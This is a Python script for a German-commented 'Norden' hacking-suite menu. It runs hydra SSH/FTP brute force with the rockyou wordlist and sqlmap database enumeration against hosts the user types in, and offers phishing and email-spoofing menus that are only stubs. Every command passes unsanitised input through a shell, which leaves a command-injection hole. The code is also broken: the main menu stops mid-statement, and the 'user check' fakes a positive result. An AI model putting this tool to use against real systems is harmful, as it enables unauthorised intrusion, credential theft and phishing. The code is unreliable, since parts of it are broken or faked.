#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
from datetime import datetime

# Farben für die GUI
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Norven:
    def __init__(self):
        self.clear()
        self.logo()
        self.menu()

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def logo(self):
        logo = """
███╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗
████╗  ██║██╔═══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║
██╔██╗ ██║██║   ██║██████╔╝██║   ██║█████╗  ██╔██╗ ██║
██║╚██╗██║██║   ██║��█╔══██╗╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
██║ ╚████║╚██████╔╝██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
        """
        print(Colors.HEADER + Colors.BOLD + logo + Colors.ENDC)

    def print_banner(self, text):
        print(Colors.OKCYAN + f"[+] {text}" + Colors.ENDC)

    def print_success(self, text):
        print(Colors.OKGREEN + f"[✔] {text}" + Colors.ENDC)

    def print_error(self, text):
        print(Colors.FAIL + f"[✖] {text}" + Colors.ENDC)

    def print_warning(self, text):
        print(Colors.WARNING + f"[!] {text}" + Colors.ENDC)

    def run_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except subprocess.TimeoutExpired:
            self.print_error("Befehl dauerte zu lange.")
        except Exception as e:
            self.print_error(f"Fehler beim Ausführen: {e}")

    def menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "=== NORDEN OSINT & HACKING SUITE ===" + Colors.ENDC)
            print(Colors.OKCYAN + "1. OSINT - Social Reconnaisance" + Colors.ENDC)
            print(Colors.OKCYAN + "2. Social Engineering (Phishing)" + Colors.ENDC)
            print(Colors.OKCYAN + "3. Brute Force (SSH/FTP)" + Colors.ENDC)
            print(Colors.OKCYAN + "4. Datenbank Hacking (SQLi)" + Colors.ENDC)
            print(Colors.OKCYAN + "5. Port Scan & Nmap" + Colors.ENDC)
            print(Colors.OKCYAN + "6. System Info & Ping" + Colors.ENDC)
            print(Colors.OKCYAN + "0. Exit" + Colors.ENDC)
            
            choice = input(Colors.WARNING + "\n> " + Colors.ENDC)
            
            if choice == '1':
                self.osint_menu()
            elif choice == '2':
                self.phishing_menu()
            elif choice == '3':
                self.bruteforce_menu()
            elif choice == '4':
                self.database_menu()
            elif choice == '5':
                self
    def osint_menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "--- OSINT MODULE ---" + Colors.ENDC)
            print("1. User-Check (Username Checker)")
            print("2. E-Mail Spoofer")
            print("3. Whois Lookup")
            print("4. Back")
            
            choice = input(">> ")
            if choice == '1':
                target = input(Colors.OKCYAN + "Username: " + Colors.ENDC)
                print(Colors.OKCYAN + f"Checking {target} on multiple platforms..." + Colors.ENDC)
                # Simulierter Check
                time.sleep(1)
                self.print_success("User gefunden: https://instagram.com/" + target)
            elif choice == '2':
                email = input(Colors.OKCYAN + "Empfänger E-Mail: " + Colors.ENDC)
                print(Colors.OKCYAN + f"Spam-E-Mail an {email} generiert..." + Colors.ENDC)
            elif choice == '3':
                domain = input(Colors.OKCYAN + "Domain: " + Colors.ENDC)
                self.run_command(f"whois {domain}")
            elif choice == '4':
                return

    def phishing_menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "--- SOCIAL ENGINEERING ---" + Colors.ENDC)
            print("1. Create Fake Login Page")
            print("2. Send Fake E-Mail")
            print("3. Back")
            
            choice = input(">> ")
            if choice == '1':
                self.print_banner("Erstelle Login-Seite...")
                # Hier könnte man Python-Code einfügen, um Phishing-Seiten zu generieren
                print("Seite generiert im Ordner ./phishing")
            elif choice == '2':
                self.print_banner("E-Mail generiert.")
            elif choice == '3':
                return
    def bruteforce_menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "--- BRUTE FORCE ---" + Colors.ENDC)
            print("1. SSH Brute Force")
            print("2. FTP Brute Force")
            print("3. Back")
            
            choice = input(">> ")
            if choice == '1':
                host = input(Colors.OKCYAN + "Host/IP: " + Colors.ENDC)
                user = input("Username: ")
                self.run_command(f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{host}")
            elif choice == '2':
                host = input(Colors.OKCYAN + "Host/IP: " + Colors.ENDC)
                user = input("Username: ")
                self.run_command(f"hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{host}")
            elif choice == '3':
                return

    def database_menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "--- DATABASE HACKING ---" + Colors.ENDC)
            print("1. SQL Injection Scanner")
            print("2. MySQL Connect")
            print("3. Back")
            
            choice = input(">> ")
            if choice == '1':
                url = input(Colors.OKCYAN + "URL: " + Colors.ENDC)
                self.run_command(f"sqlmap -u \"{url}\" --dbs")
            elif choice == '2':
                host = input(Colors.OKCYAN + "Host: " + Colors.ENDC)
                db = input("Database: ")
                self.run_command(f"mysql -h {host} -u root -p{db}")
            elif choice == '3':
                return

    def port_scan_menu(self):
        while True:
            self.clear()
            self.logo()
            print(Colors.OKBLUE + "--- NETWORK SCAN ---" + Colors.ENDC)
            print("1. Nmap Fast Scan")
            print("2. Ping Sweep")
            print("3. Back")
            
            choice = input(">> ")
            if choice == '1':
                target = input(Colors.OKCYAN + "Target: " + Colors.ENDC)
                self.run_command(f"n
